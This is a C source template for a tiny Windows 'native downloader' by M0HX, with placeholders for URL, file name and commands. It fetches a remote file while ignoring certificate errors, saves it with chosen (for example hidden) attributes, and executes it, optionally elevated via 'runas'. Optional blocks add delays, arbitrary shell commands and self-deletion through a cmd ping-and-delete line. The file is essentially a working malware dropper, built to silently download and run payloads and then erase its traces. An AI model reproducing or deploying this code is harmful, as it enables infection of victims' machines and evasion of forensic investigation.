/*
__________________________________________________________________________________________________________________________________________
| * ______            '     ___    ___               ____     '    `                      ___               '        __                    |
|  /\  _  \    *`          /\_ \  /\_ \   *         /\  _`\           *         '        /\_ \         '*           /\ \      *            |
|  \ \ \L\ \  _____     ___\//\ \ \//\ \     ___    \ \ \/\ \  * ___   __  __  __    ___ \//\ \     ___      __     \_\ \     __   _ __    |
|   \ \  __ \/\ '__`\  / __`\\ \ \  \ \ \   / __`\   \ \ \ \ \  / __`\/\ \/\ \/\ \ /' _ `\ \ \ \   / __`\  /'__`\   /'_` \  /'__`\/\`'__\  |
|    \ \ \/\ \ \ \L\ \/\ \L\ \\_\ \_ \_\ \_/\ \L\ \   \ \ \_\ \/\ \L\ \ \ \_/ \_/ \/\ \/\ \ \_\ \_/\ \L\ \/\ \L\.\_/\ \L\ \/\  __/\ \ \/   |
|     \ \_\ \_\ \ ,__/\ \____//\____\/\____\ \____/ *  \ \____/\ \____/\ \___/___/'\ \_\ \_\/\____\ \____/\ \__/.\_\ \___,_\ \____\\ \_\   |
|      \/_/\/_/\ \ \/  \/___/ \/____/\/____/\/___/      \/___/  \/___/  \/__//__/   \/_/\/_/\/____/\/___/  \/__/\/_/\/__,_ /\/____/ \/_/   |
|    *          \ \_\                    *          '                         *                                *                     `     |
| *  `           \/_/         *             '            '      *                  '             *      `                 *     '          |
|__________________________________________________________________________________________________________________________________________|
|                                                                                                                                          |
|  [A Native Downloader From Outer Space]                                                                                                  |
|                                                                                                                                          |
|  Author: M0HX                                                                                                                            |
|  Date: 31/10/2020                                                                                                                        |
|  Email: m0hx@protonmail.com                                                                                                              |
|__________________________________________________________________________________________________________________________________________|  
|                                                                                                                                          |
|  Language: C                                                                                                                             |
|  Architecture: x86                                                                                                                       |
|  Output: .EXE                                                                                                                            |
|  Output Sizes:                                                                                                                           |
|  -Default Settings with Crinkler and Optimized CL settings, NoAgent, Short Name): ~498 Bytes                                             |
|  -Best Settings (Invisible/NoAgent) With Crinkler and Optimized CL settings): ~495 Bytes                                                 |
|__________________________________________________________________________________________________________________________________________|

*/

#include <windows.h>
#include <wininet.h>
#include <shlobj.h>

int main()
{
    /*-------------------------------------Vars-------------------------------------*/
    char                 *szURL = "xURLReplacex";                                  // URL
    char                 *szFileName = "xFileNameReplacex";                        // File Name
    /*START:UsrAgentNull
    char                 *szUserAgent = NULL;                                      // User Agent NULL String
    END:UsrAgentNull*/
    
    /*START:UsrAgentCustom
    char                 *szUserAgent = "xUserAgentReplacex";                        // User Agent String (Default = "Mozilla/5.0")
    END:UsrAgentCustom*/

    /*START:ArgsNull
    char                 *szArgs = NULL;                                            // Arguments NULL Passed
    END:ArgsNull*/

    /*START:ArgsCustom
    char                 *szArgs = "xArgsReplacex";                                  // Arguments Passed
    END:ArgsCustom*/

  
    /*START:shCommandNULL
    char                 *szShellCommand = NULL;                                    // Shell Execute NULL Command
    END:shCommandNULL*/

    /*START:shCommCustom
    char                 *szShellCommand = "xShellCommandReplacex";                 // Shell Execute Command
    END:shCommCustom*/


    /*START:shCoArgNull
    char                 *szShellArgs = NULL;                                      // Shell Execute Command Arguments NULL
    END:shCoArgNull*/


    /*START:shArgsCustm
    char                 *szShellArgs = "xShellArgsReplacex";                        // Shell Execute Command Arguments
    END:shArgsCustm*/

    
    
    unsigned short int   ShellVisibility = xShellVisibilityReplacex;               // Shell Execute Command Execution Visibility
    unsigned int         Attributes = xAttributesReplacex;                         // Downloaded File Attributes (Default = 128)
    unsigned int         SelfAttributes = xSelfAttributesReplacex;                 // Self Attributes
    unsigned short int   Visibility = xVisibilityReplacex;                         // Execution Visibility (Default = 5)
    unsigned short int   CreationDisposition = xCreationDispositionReplacex;       // File Creation
    char                 lpBuffer[2048];                // Buffer
    TCHAR                lpPath[MAX_PATH];              // Path
    TCHAR                szModuleName[MAX_PATH];        // Self Name
    unsigned long        BytesNext = 1;                 // Bytes Next
    unsigned long        BytesWritten = 0;              // Bytes Written
    HINTERNET            InternetHandle;                // Internet Handle
    HINTERNET            UrlHandle;                     // Url Handle
    HANDLE               FileHandle;                    // File Handle
    /*------------------------------------------------------------------------------*/


    /*START:SetItselfAttributesOnExecute
    // Retrieves the fully qualified path for the file that contains the specified module.
    GetModuleFileName(NULL, szModuleName, MAX_PATH);
    
    // Sets the attributes for a file or directory.
    SetFileAttributesA(szModuleName, SelfAttributes);
    END:SetItselfAttributesOnExecute*/

    /*START:DelayBeforeDownloading
    // Suspends the execution of the current thread until the time-out interval elapses.
    Sleep(xTimeOutx);
    END:DelayBeforeDownloading*/

    /*START:ShellExecuteBeforeDownloading
    // Performs an operation on a specified file.
    ShellExecuteA(0, 0, szShellCommand, szShellArgs, 0, ShellVisibility);
    END:ShellExecuteBeforeDownloading*/

    /*START:ShellExecuteAsAdminBeforeDownloading
    // Performs an operation on a specified file.
    ShellExecuteA(0, "runas", szShellCommand, szShellArgs, 0, ShellVisibility);
    END:ShellExecuteAsAdminBeforeDownloading*/


    // Initializes an application's use of the WinINet functions. With custom user-agent string.
    InternetHandle = InternetOpen(szUserAgent, 0, 0, 0, 0);

    // Check if Internet Handle is null
    if (InternetHandle == NULL) {
        exit(0);
    }

    // Opens a resource specified by a complete FTP or HTTP URL. With flags to no cache, no cookies and ignore ssl invalid certs
    UrlHandle = InternetOpenUrl(InternetHandle, szURL, 0, 0, INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID|INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_NO_COOKIES|INTERNET_FLAG_RELOAD, 0);

    // Check if UrlHandle is null
    if (UrlHandle == NULL) {
        exit(0);
    }


    /*START:SetDefaultPath
    // Creates or opens a file or I/O device.
    FileHandle = CreateFile(szFileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CreationDisposition, Attributes, 0);
    END:SetDefaultPath*/

    /*START:SetTempPath
    // Retrieves the path of the directory designated for temporary files.
    GetTempPath(MAX_PATH, lpPath);

    // Creates or opens a file or I/O device.
    FileHandle = CreateFile(lstrcat(lpPath, szFileName), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CreationDisposition, Attributes, 0);
    END:SetTempPath*/

    /*START:SetCSIDLPath
    // Deprecated. Gets the path of a folder identified by a CSIDL value.
    SHGetFolderPath(NULL, xCSIDLPathx, NULL, 0, lpPath);

    // Creates or opens a file or I/O device.
    FileHandle = CreateFile(lstrcat(lstrcat(lpPath, "\\"), szFileName), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CreationDisposition, Attributes, 0);
    END:SetCSIDLPath*/


    while(BytesNext != 0) {
        // Reads data from a handle opened by the InternetOpenUrl, FtpOpenFile, or HttpOpenRequest function.
        InternetReadFile(UrlHandle, lpBuffer, sizeof(lpBuffer), &BytesNext);
        // Writes data to the specified file or input/output (I/O) device.
        WriteFile(FileHandle, lpBuffer, BytesNext, &BytesWritten, 0);
    }
    
    // Junk ASM for bug fix hack. Where file does not execute or commands.
    __asm {  
    jmp short LABEL
    LABEL:
    }

    // Closes an open object handles.
    CloseHandle(FileHandle);
    CloseHandle(UrlHandle);
    CloseHandle(InternetHandle);


    /*START:DelyAfterDown
    // Suspends the execution of the current thread until the time-out interval elapses.
    Sleep(xTimeOutx);
    END:DelyAfterDown*/

    /*START:ShellExecAftrDownlod
    // Performs an operation on a specified file.
    ShellExecuteA(0, 0, szShellCommand, szShellArgs, 0, ShellVisibility);
    END:ShellExecAftrDownlod*/

    /*START:ShlExecAsAdminAftrDown
    // Performs an operation on a specified file.
    ShellExecuteA(0, "runas", szShellCommand, szShellArgs, 0, ShellVisibility);
    END:ShlExecAsAdminAftrDown*/

    /*START:ExecuteFromDefaultPath
    // Performs an operation on a specified file.
    ShellExecuteA(0, 0, szFileName, szArgs, 0, Visibility);
    END:ExecuteFromDefaultPath*/

    /*START:ExecuteFromTempCSIDLPath
    // Performs an operation on a specified file.
    ShellExecuteA(0, 0, lpPath, szArgs, 0, Visibility);
    END:ExecuteFromTempCSIDLPath*/

    /*START:ExecuteAsAdminFromDefaultPath
    // Performs an operation on a specified file.
    ShellExecuteA(0, "runas", szFileName, szArgs, 0, Visibility);
    END:ExecuteAsAdminFromDefaultPath*/

    /*START:ExecutAsAdmineFromTempCSIDLPath
    // Performs an operation on a specified file.
    ShellExecuteA(0, "runas", lpPath, szArgs, 0, Visibility);
    END:ExecuteAsAdminFrmTempCSIDLPath*/

    /*START:DelayAfterExecute
    // Suspends the execution of the current thread until the time-out interval elapses.
    Sleep(xTimeOutx);
    END:DelayBeforeExecute*/

    /*START:ShellExecuteAfterExecute
    // Performs an operation on a specified file.
    ShellExecuteA(0, 0, szShellCommand, szShellArgs, 0, ShellVisibility);
    END:ShellExecuteAfterExecute*/

    /*START:ShlelExecutAsAdminAfterExecut
    // Performs an operation on a specified file.
    ShellExecuteA(0, "runas", szShellCommand, szShellArgs, 0, ShellVisibility);
    END:ShlelExecutAsAdminAfterExecut*/

    /*START:DeleteItselfAfterExecution
    // Retrieves the fully qualified path for the file that contains the specified module.
    GetModuleFileName(NULL, szModuleName, MAX_PATH);
    
    // Self Remove String: pings localhost 5 times to delay and then force delete itself.
    char *szSelfRemove = "/C ping localhost -n 5 -w 3000 > Nul & Del /f /q /a \"";

    // Performs an operation on a specified file.
    ShellExecuteA(0, 0, "cmd.exe", lstrcat(szSelfRemove,szModuleName), 0, 0);
    END:DeleteItselfAfterExecution*/
    
    // Terminates the calling process. Closes Itself
    exit(0);
    
    return 0;
}
